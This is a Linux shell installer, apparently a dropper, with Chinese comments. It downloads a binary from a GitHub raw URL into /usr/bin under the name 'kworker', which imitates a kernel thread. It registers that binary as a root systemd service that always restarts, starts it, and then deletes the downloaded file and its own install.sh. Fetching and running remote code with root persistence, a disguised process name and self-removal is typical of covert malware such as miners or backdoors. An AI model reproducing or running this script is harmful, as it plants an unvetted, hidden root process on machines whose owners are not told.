wget https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker /usr/bin/kworker
mv kworker /usr/bin/kworker
chmod +x /usr/bin/kworker

#!/bin/bash

# 将脚本文件转换为 Unix 格式，去掉可能存在的 Windows 换行符
if [ -f "$0" ]; then
    sed -i 's/\r//' "$0"
fi

# 设置kworker路径和工作目录
KWORKER_PATH="/usr/bin/kworker"
WORKING_DIR="/usr/bin/"

# 创建systemd服务文件内容
SERVICE_CONTENT="[Unit]
Description=kworker Service
After=network.target

[Service]
ExecStart=$KWORKER_PATH
WorkingDirectory=$WORKING_DIR
Restart=always
User=root
Group=root
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target"

# 检测系统类型并创建服务
if [ -f /etc/debian_version ]; then
    # Debian/Ubuntu 系统
    echo "Detected Debian/Ubuntu system."
    
    # 创建systemd服务文件
    echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service
    
elif [ -f /etc/redhat-release ]; then
    # CentOS 系统
    echo "Detected CentOS system."
    
    # 创建systemd服务文件
    echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service
    
else
    echo "Unsupported system type."
    exit 1
fi

# 重新加载systemd配置
systemctl daemon-reload

# 启用服务
systemctl enable kworker.service

# 启动服务
systemctl start kworker.service

# 显示服务状态
systemctl status kworker.service


rm kworker
rm install.sh
